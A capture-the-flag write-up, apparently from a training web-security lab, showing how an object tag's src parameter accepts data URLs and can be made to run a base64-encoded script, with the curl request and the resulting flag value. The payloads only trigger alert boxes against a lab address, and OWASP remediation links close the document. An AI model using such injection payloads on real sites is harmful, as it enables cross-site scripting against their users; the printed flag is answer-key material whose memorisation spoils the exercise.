# Cross Site Scripting (XSS) - Data URLs

In the first section of the home page, an image redirect to [the location](http://192.168.56.101/?page=media&src=nsa) where an `object` tag specifies the URL of NSA logotype, via `data` attribute.

The value of `data` attribute change accordingly the value GET parameter `src` in the URL.

Using special format, called [data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs), in `src` allow to embed small inline data in HTML document.

<details>
<summary>Embed a text file</summary>

```
data:text/html,<h1 style="font-size:75px; background-color:red">Hello World!</h1>
```
</details>

<details>
<summary>Embed an image</summary>

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAo0lEQVR42u3RAQ0AAAjDMO5fNCCDkG4SmupdZwoQIAICRECACAgQAQECBIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACAgQIEAEBIiAABGQ7w2x48edS3GF7AAAAABJRU5ErkJggg==
```
</details>

Not only any data can be passed, but script can be used to this which allow execution of the code, as shown on the [example](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)
<img width="800" alt="image" src="https://user-images.githubusercontent.com/46742040/202879013-06386e15-be43-4894-9a3c-c3630a569a0e.png">
<details>
<summary>Embed a scipt</summary>

```
data:text/html,<script>alert('42 - The answer to life, the universe and everything')</script>
```
</details>


By tring base64 encoded string for the `src` paramter, with [appropriate syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs#syntax), the following address will give the flag

```
$ echo -n '<script>alert('hi');</script>' | base64
PHNjcmlwdD5hbGVydChoaSk7PC9zY3JpcHQ+

$ curl http://{IP_ADDR}/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4\=
[...]
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
[...]
```

# Remedattion
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://owasp.org/www-community/attacks/xss/
